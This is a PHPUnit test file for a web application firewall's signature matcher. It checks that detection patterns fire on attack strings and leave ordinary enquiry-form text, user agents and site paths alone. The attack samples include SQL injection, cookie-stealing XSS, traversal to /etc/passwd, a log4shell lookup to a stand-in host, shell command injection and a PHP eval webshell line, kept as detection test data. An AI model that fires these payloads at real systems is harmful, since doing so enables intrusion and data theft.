<?php

declare(strict_types=1);

namespace Tests\Unit;

use App\Security\Waf\Signatures;
use PHPUnit\Framework\TestCase;

/** The managed rule sets catch real attack syntax and leave ordinary text alone. */
final class WafSignaturesTest extends TestCase
{
    private static function hit(string $set, string $input): ?string
    {
        return Signatures::match($set, Signatures::normalize($input));
    }

    public function test_every_pattern_compiles(): void
    {
        foreach (Signatures::SETS as $set => $def) {
            foreach ($def['patterns'] as $p) {
                self::assertNotFalse(@preg_match($p, ''), "{$set}: {$p}");
            }
            self::assertContains($def['default'], ['block', 'log', 'off'], $set);
        }
    }

    /** @return array<string,array{string,string}> */
    public static function attacks(): array
    {
        return [
            'union select' => ['sqli', "1 UNION ALL SELECT username, password FROM users"],
            'union with comments' => ['sqli', "1/**/UNION/**/SELECT/**/1,2"],
            'url-encoded union' => ['sqli', '1%20UNION%20SELECT%201'],
            'double-encoded union' => ['sqli', '1%2520UNION%2520SELECT%25201'],
            'tautology' => ['sqli', "admin' OR 1=1 --"],
            'string tautology' => ['sqli', "x' or 'a'='a"],
            'comment ending' => ['sqli', "admin'--"],
            'stacked drop' => ['sqli', "1; DROP TABLE users"],
            'time based' => ['sqli', "1 AND SLEEP(5)"],
            'mssql delay' => ['sqli', "1'; WAITFOR DELAY '0:0:5'--"],
            'schema read' => ['sqli', "1 and (select count(*) from information_schema.tables)>0"],
            'outfile' => ['sqli', "1 INTO OUTFILE '/var/www/x.php'"],
            'mysql comment' => ['sqli', '1 /*!50000UNION*/ SELECT'],
            'script tag' => ['xss', '<script>alert(document.cookie)</script>'],
            'img onerror' => ['xss', '<img src=x onerror=alert(1)>'],
            'svg onload' => ['xss', '<svg/onload=alert(1)>'],
            'javascript url' => ['xss', 'javascript:alert(1)'],
            'entity-encoded' => ['xss', '&lt;script&gt;alert(1)&lt;/script&gt;'],
            'encoded iframe' => ['xss', '%3Ciframe%20src%3Dx%3E'],
            'data html' => ['xss', 'data:text/html;base64,PHNjcmlwdD4='],
            'dotdot' => ['traversal', '../../../../etc/passwd'],
            'encoded dotdot' => ['traversal', '%2e%2e%2f%2e%2e%2fetc%2fpasswd'],
            'windows dotdot' => ['traversal', '..\\..\\windows\\win.ini'],
            'php wrapper' => ['traversal', 'php://filter/convert.base64-encode/resource=index'],
            'log4shell' => ['rce', '${jndi:ldap://evil.example/a}'],
            'shell chain' => ['rce', 'x; cat /etc/passwd'],
            'command substitution' => ['rce', '$(whoami)'],
            'pipe id' => ['rce', '127.0.0.1 | id'],
            'php eval' => ['rce', 'eval($_POST["x"])'],
            'php tag' => ['rce', '<?php system("id"); ?>'],
            'ssti' => ['rce', '{{7*7}}'],
            'shellshock' => ['rce', '() { :; }; /bin/bash -c id'],
            'sqlmap' => ['scanners', 'sqlmap/1.7#stable (https://sqlmap.org)'],
            'nikto' => ['scanners', 'Mozilla/5.00 (Nikto/2.1.6)'],
            'nuclei' => ['scanners', 'Mozilla/5.0 Nuclei - Open-source project (github.com/projectdiscovery/nuclei)'],
            '.env' => ['probes', '/.env'],
            'nested .env' => ['probes', '/api/.env.production'],
            '.git' => ['probes', '/.git/config'],
            'wp-login' => ['probes', '/wp-login.php'],
            'xmlrpc' => ['probes', '/xmlrpc.php'],
            'phpmyadmin' => ['probes', '/phpmyadmin/index.php'],
            'phpunit rce' => ['probes', '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'],
            'backup file' => ['probes', '/backup.sql'],
            'webshell' => ['probes', '/uploads/shell.php'],
        ];
    }

    /** @dataProvider attacks */
    #[\PHPUnit\Framework\Attributes\DataProvider('attacks')]
    public function test_attacks_are_recognised(string $set, string $input): void
    {
        self::assertNotNull(self::hit($set, $input), "{$set} should catch: {$input}");
    }

    /** Real-world text from enquiry forms, searches and names that must never be blocked. */
    public function test_ordinary_text_is_left_alone(): void
    {
        $benign = [
            "Hello, I'm interested in the welder job in Dubai. Please select me for the interview.",
            'Select your country from the list, then update your profile and delete old documents.',
            "My name is O'Brien and I am 25 years old. I have 3 years' experience = good fit?",
            "Please drop us a line; update me when the visa is ready. Thanks!",
            'Can you call me at 9876543210 or email me: ravi.kumar@example.com',
            "We met at the office; id card was lost. What do I do now?",
            "The operating system (Windows) on the cafe computer didn't work.",
            'Wait... / so what are the next steps? And the fee is Rs. 5,000 + GST.',
            "Tom's and Jerry's application, 2 people, from Kerala",
            'Travel package for 2 adults & 1 child, 5 nights / 6 days, Goa → Dubai',
            'I want "sales executive" or "cashier" roles in Qatar',
            'Experience: 2019-2023 at ABC Ltd — forklift, warehouse, inventory',
            'C++ developer, 5+ years; Node.js, React, SQL Server (select, joins, indexes)',
            'Is there an age limit (18-45)? My brother is 46.',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148',
            '/overseas-jobs?country=AE&q=driver',
            '/travel-packages/dubai-5-nights?utm_source=facebook&utm_medium=cpc',
            '/blog/how-to-apply-for-a-uae-work-visa',
            '/media/2026/09/01abcxyz.webp',
            'price=5000&currency=INR&note=50% advance, rest on arrival',
            'Deepak & Sons; order #45 - please send an update',
        ];
        foreach ($benign as $text) {
            foreach (array_keys(Signatures::SETS) as $set) {
                if ($set === 'probes' && !str_starts_with($text, '/')) {
                    continue;   // probes only ever look at the path
                }
                self::assertNull(self::hit($set, $text), "{$set} wrongly matched: {$text}");
            }
        }
    }

    public function test_normalisation_decodes_twice_and_is_bounded(): void
    {
        self::assertSame('<script>', Signatures::normalize('%253Cscript%253E'));
        self::assertSame('union select', Signatures::normalize("UNION/**/SELECT"));
        self::assertSame('a b', Signatures::normalize("a\n\t  b"));
        self::assertSame('abc', Signatures::normalize("a\0bc"));
        self::assertLessThanOrEqual(Signatures::MAX_INSPECT, strlen(Signatures::normalize(str_repeat('a', 100000))));
    }
}
